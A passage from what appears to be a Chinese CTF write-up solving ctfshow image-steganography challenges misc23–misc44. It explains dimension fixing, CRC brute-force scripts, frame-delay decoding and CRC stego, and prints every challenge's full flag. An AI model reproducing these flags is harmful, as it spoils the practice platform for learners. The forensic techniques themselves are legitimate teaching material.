真flag：ctfshow{dbf7d3f84b0125e833dfd3c80820a129}</p><p>对了，还有那个缩略图用stegsolve的full blue看会更清晰，but我显示器放大图片看到老清楚了（凡尔赛boy请求出战</p></blockquote><h2 id="misc23"><a href="#misc23" class="headerlink" title="misc23"></a>misc23</h2><blockquote><p>flag在时间里。</p></blockquote><p>盲搜一波ctf意外收获四个时间段（1997-09-22T02:17:02+08:00、2055-07-15T12:14:48+08:00、2038-05-05T16:50:45+08:00、1984-08-03 18:41:46+08:00）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/23152623562626.png"></p><p>接着分别将得到的四个时间转波<a href="https://www.beijing-time.org/shijianchuo/"><strong>时间戳</strong></a>得到如下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">874865822</span><br><span class="line">2699237688</span><br><span class="line">2156662245</span><br><span class="line">460377706</span><br></pre></td></tr></table></figure><p>最后我们16进制转一下试试对(mei)不(mao)对(bing)，得到flag：ctfshow{3425649ea0e31938808c0de51b70ce6a}</p><h1 id="图片篇-文件结构"><a href="#图片篇-文件结构" class="headerlink" title="图片篇(文件结构)"></a>图片篇(文件结构)</h1><h2 id="misc24"><a href="#misc24" class="headerlink" title="misc24"></a>misc24</h2><blockquote><p>flag在图片上面。</p></blockquote><p>改高度得到flag：ctfshow{dd7d8bc9e5e873eb7da3fa51d92ca4b7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2445596498846.png"></p><p>PS：写个小技巧⑧，大家可以将图片的高宽转为16进制并搜索找到对应位置，然后将更改好的数据填进去保存即可</p><h2 id="misc25"><a href="#misc25" class="headerlink" title="misc25"></a>misc25</h2><blockquote><p>flag在图片下面。</p></blockquote><p>同上，得到flag：ctfshow{494f611cc5842dd597f460874ce38f57}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3154825454155.png"></p><h2 id="misc26"><a href="#misc26" class="headerlink" title="misc26"></a>misc26</h2><blockquote><p>flag还是在图片下面，但到底有多下面？。</p></blockquote><p>再调高点就好了，其中图片高度还需要我们跑下脚本来爆破出得到flag：ctfshow{94aef125e087a7ccf2e28e742efd704c}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88926424696.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;misc26.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0xEC9CCBC6</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x25e</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210331194830817.png"></p><h2 id="misc27"><a href="#misc27" class="headerlink" title="misc27"></a>misc27</h2><blockquote><p>flag在图片下面。</p></blockquote><p>同上（指misc24，得到flag：ctfshow{5cc4f19eb01705b99bf41492430a1a14}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/272766645589491.png"></p><h2 id="misc28"><a href="#misc28" class="headerlink" title="misc28"></a>misc28</h2><blockquote><p>flag在图片下面。</p></blockquote><p>同上，得到flag：ctfshow{59c8bc525426166b1c893fe12a387fd7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210331210629075.png"></p><h2 id="misc29"><a href="#misc29" class="headerlink" title="misc29"></a>misc29</h2><blockquote><p>flag在图片下面。</p></blockquote><p>同上，得到flag：ctfshow{03ce5be6d60a4b3c7465ab9410801440}</p><p>对了，gif我每一帧都把他高度给改了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/999585852954185.png"></p><h2 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h2><blockquote><p>正确的宽度是950。</p></blockquote><p>根据提示将高度改为950即可得到flag：ctfshow{6db8536da312f6aeb42da2f45b5f213c}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3331518413030185414.png"></p><h2 id="misc31"><a href="#misc31" class="headerlink" title="misc31"></a>misc31</h2><blockquote><p>高度是正确的，但正确的宽度是多少呢。</p></blockquote><p>还是第一次遇到bmp的这种题</p><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/260702527">https://zhuanlan.zhihu.com/p/260702527</a></p><p>大概了解了下bmp的文件结构就开始做题辣~</p><p>首先我们从FF那开始一直复制到最后看看它的文件大小（最后那个不用管他，故意多加的⑧），然后用它除以三就是像素值，最后根据提示高度正确算出正确的宽度，也就是说487202/3/150=1082便是正确的那个宽度了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/57197942159756446323231832.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84989484323232.png"></p><p>最后改下宽即可得到flag：ctfshow{fb09dcc9005fe3feeefb73646b55efd5}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/323559529255848.png"></p><h2 id="misc32"><a href="#misc32" class="headerlink" title="misc32"></a>misc32</h2><blockquote><p>高度是正确的，但正确的宽度是多少呢。</p></blockquote><p>010打开查找图片的CRC：0xE14A4C0B</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/32231546246457932.png"></p><p>跑脚本爆破它的宽</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3265226925962699.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;misc32.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0xE14A4C0B</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br><span class="line"><span class="comment">#1044 150</span></span><br><span class="line"><span class="comment">#hex: 0x414 0x96</span></span><br></pre></td></tr></table></figure><p>最后改下宽即可得到flag：ctfshow{685082227bcf70d17d1b39a5c1195aa9}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/555321564279794.png"></p><h2 id="misc33"><a href="#misc33" class="headerlink" title="misc33"></a>misc33</h2><blockquote><p>出题人丧心病狂，把高度也改了</p></blockquote><p>老样子，010打开找到图片的CRC：0x5255A798</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/333333645524587845.png"></p><p>跑脚本爆破它的高宽</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/33333152262824896.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;misc33.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x5255A798</span>):</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br><span class="line"><span class="comment">#978 142</span></span><br><span class="line"><span class="comment">#hex: 0x3d2 0x8e</span></span><br></pre></td></tr></table></figure><p>最后改下高宽即可得到flag：ctfshow{03070a10ec3a3282ba1e352f4e07b0a9}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/85485196.png"></p><h2 id="misc34"><a href="#misc34" class="headerlink" title="misc34"></a>misc34</h2><blockquote><p>出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900</p></blockquote><p>由于crc都给改了，我们只能通过爆破获取flag惹，在一堆黑图中看到了张含有flag的图：ctfshow{03e102077e3e5de9dd9c04aba16ef014}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/34521464163434.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;misc34.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">width = c[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">height = c[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">900</span>,<span class="number">1200</span>):</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&#x27;./out/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    img = c[:<span class="number">16</span>]+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+c[<span class="number">20</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2 id="misc35"><a href="#misc35" class="headerlink" title="misc35"></a>misc35</h2><blockquote><p>出题人负隅顽抗，但我们知道正确宽度肯定大于900</p></blockquote><p>这里我们先把高度改高一些到能看到下面的东西（这里我把高改到1000），然后同上跑脚本得到flag：ctfshow{ca35201ca9ed607e5a68f44ef573fbc3}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/35555678451235.png"></p><p><strong>附上脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;misc35.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">900</span>,<span class="number">1000</span>):</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&#x27;./out/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    img = c[:c.index(<span class="string">b&#x27;\x03\xe8\x03\x84&#x27;</span>)+<span class="number">2</span>]+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i)+c[c.index(<span class="string">b&#x27;\x03\xe8\x03\x84&#x27;</span>)+<span class="number">4</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2 id="misc36"><a href="#misc36" class="headerlink" title="misc36"></a>misc36</h2><blockquote><p>出题人坦白从宽，正确的宽度在920-950之间</p></blockquote><p>gif这个给我坑了好长时间~ 其实和前面还是一个样跑脚本得到flag：ctfshow{1ebf739f832906d60f57436b8179166f}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/66636158445.png"></p><p>不说了直接看脚本吧~ 呜呜呜~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;misc36.gif&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">900</span>,<span class="number">950</span>):</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&#x27;./out/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.gif&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    img = c[:c.index(<span class="string">b&#x27;\x00\x00\x84\x03\xb6\x03&#x27;</span>)+<span class="number">2</span>]+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i)[::-<span class="number">1</span>]+c[c.index(<span class="string">b&#x27;\x00\x00\x84\x03\xb6\x03&#x27;</span>)+<span class="number">4</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2 id="misc37"><a href="#misc37" class="headerlink" title="misc37"></a>misc37</h2><blockquote><p>flag在图片里</p></blockquote><p>逐帧保存翻看即可得到flag：ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_9.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_14.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_21.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_31.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_34.jpg"></p><h2 id="misc38"><a href="#misc38" class="headerlink" title="misc38"></a>misc38</h2><blockquote><p>flag在图片里</p></blockquote><p>奇怪的知识增加.jpg 见识到了什么叫apng（想了解更多就自行百度~</p><p>这里我直接利用其 <a href="https://pan.baidu.com/s/1w-KLN09gVs4VR6BC-DQNng"><strong>专门的工具</strong></a>（提取码：2v42）打开得到flag：ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/09403838521859529.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3838522964.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/36383767845612546.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1040203038624161.png"></p><h2 id="misc39"><a href="#misc39" class="headerlink" title="misc39"></a>misc39</h2><blockquote><p>flag就像水，忽快忽慢地流</p></blockquote><p>gif帧数间隔隐写，使用工具 <a href="https://pan.baidu.com/s/1hqRHsX_zpl6TXuJLq4JIdg"><strong>ImageMagick</strong></a>（提取码：t7hc）提取帧数<br>这里友情提醒千万别用Windows下的各种版本都bug无数，亲测！！因此我发的也是Linux下的~ 不信你就自己爬去**<a href="https://imagemagick.org/script/download.php">官网</a>**下一个试试（或者去更好用的中文站：<a href="http://www.imagemagick.com.cn/download.html%EF%BC%89">http://www.imagemagick.com.cn/download.html）</a></p><p>kali下编译安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>kali下提取帧数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%T &quot; misc39.gif &gt; misc39.txt</span><br><span class="line"></span><br><span class="line">37 37 36 36 36 37 37 37 37 37 36 37 36 36 37 37 36 36 37 37 36 37 37 37 36 36 37 37 37 37 36 37 36 36 36 37 37 36 37 37 37 37 37 37 37 36 37 37 37 37 37 37 37 36 37 37 36 37 37 36 37 36 37 36 37 37 36 36 37 36 36 37 37 37 36 36 36 36 37 37 36 36 36 37 36 37 37 36 36 37 36 37 37 36 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 37 36 37 37 36 37 36 37 37 37 36 36 37 37 36 37 37 36 36 36 37 36 36 37 37 36 37 37 37 37 37 36 36 36 37 36 37 37 36 36 37 36 37 36 37 37 36 36 37 36 36 37 37 36 37 37 36 36 37 37 37 36 36 36 37 37 36 36 37 36 36 36 37 37 37 36 36 37 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 37 36 36 36 36 37 36 37 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 36 37 36 37 37 36 36 36 37 37 37 37 36 36 36 36 37 36 37 37 36 36 36 36 36 37 37 36 37 36 36 36 37 37 36 37 36 37 36 37 37 37 36 36 37 37 37 37 37 37 36 37 </span><br></pre></td></tr></table></figure><p>转01再七位一组转字符即可得到flag：ctfshow{52812ff995fb7be268d963a9ebca0459}</p><p><strong>附上脚本</strong>（白嫖V3geD4g师傅脚本.gif）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#xx27;</span></span><br><span class="line">s = s.replace(<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># s = s[1:]</span></span><br><span class="line">print(s)</span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i*<span class="number">7</span>:i*<span class="number">7</span>+<span class="number">7</span>],<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#11000111110100110011011100111101000110111111101111111011011010101100100111000011000101100101100110110011001110010111001011010111001101100010011011111000101100101011001001101100111000110010001110010110110011001111000010111001110010111000101100011110000101100000110100011010101110011111101</span></span><br><span class="line"><span class="comment">#287</span></span><br><span class="line"><span class="comment">#ctfshow&#123;52812ff995fb7be268d963a9ebca0459&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h2><blockquote><p>flag就像歌，有长有短仿佛岁月悠悠</p></blockquote><p>原理同上，只是换成apng的帧时间间隔隐写（也就是misc38的操作对其进行分解），最后跑下脚本得到flag：ctfshow{95ca0297dff0f6b1bdaca394a6fcb95b}</p><p><strong>附上脚本</strong>（V3geD4g TQL！）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>,<span class="number">69</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;./misc40/apngframe&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">    c =f.read()</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(c.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="misc41"><a href="#misc41" class="headerlink" title="misc41"></a>misc41</h2><blockquote><p>（本题为Misc入门图片篇和愚人节比赛特别联动题）<br>H4ppy Apr1l F001’s D4y！<br> 愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。</p></blockquote><p>根据提示搜索下f001就直接看到了flag：ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8418799745325141.png"></p><h2 id="misc42"><a href="#misc42" class="headerlink" title="misc42"></a>misc42</h2><blockquote><p>flag有多长？2cm……不好意思打错了，41位</p></blockquote><p>IDAT块长度隐写，借助工具tweakpng（010也行），跑下脚本得到flag：ctfshow{078cbd0f9c8d3f2158e70529f8913c65}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/48959566545612342.png"></p><p>贴上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">123</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">100</span>,<span class="number">48</span>,<span class="number">102</span>,<span class="number">57</span>,<span class="number">99</span>,<span class="number">56</span>,<span class="number">100</span>,<span class="number">51</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">101</span>,<span class="number">55</span>,<span class="number">48</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">57</span>,<span class="number">102</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">99</span>,<span class="number">54</span>,<span class="number">53</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;078cbd0f9c8d3f2158e70529f8913c65&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc43"><a href="#misc43" class="headerlink" title="misc43"></a>misc43</h2><blockquote><p>错误中隐藏着通往正确答案的道路</p></blockquote><p>crc隐写，010打开将各个idat的crc提取出来得到flag：ctfshow{6eb2589ffff5e390fe6b87504dbc0892}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/6643255684943.png"></p><h2 id="misc44"><a href="#misc44" class="headerlink" title="misc44"></a>misc44</h2><blockquote><p>错误中还隐藏着坑</p></blockquote><p>利用一款自动化检测修复PNG损坏的取证工具PCRT进行修复crc校验出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我是kali下整的</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;sherlly&#x2F;PCRT.git</span><br><span class="line">cd PCRT</span><br><span class="line">python PCRT.py -y -v -i misc44.png &gt; 44.txt</span><br></pre></td></tr></table></figure><p>再跑下脚本得到flag：ctfshow{cc1af32bf96308fc1263231be783f69e}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;44.txt&#x27;</span>)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    c = f.readline()</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;chunk crc&#x27;</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="comment"># print(c)</span></span><br><span class="line">            res+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Correct IDAT CRC&#x27;</span> <span class="keyword">in</span> c:</span><br><span class="line">            res+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">print(res)</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)//<span class="number">8</span>):</span><br><span class="line">    a = res[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(a,<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#11111111111111110110001101110100011001100111001101101000011011110111011101111011011000110110001100110001011000010110011000110011001100100110001001100110001110010011011000110011001100000011100001100110011000110011000100110010001101100011001100110010001100110011000101100010011001010011011100111000001100110110011000110110001110010110010101111101</span></span><br><span class="line"><span class="comment">#344</span></span><br><span class="line"><span class="comment">#ÿÿctfshow&#123;cc1af32bf96308fc1263231be783f69e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc45"><a href="#misc45" class="headerlink" 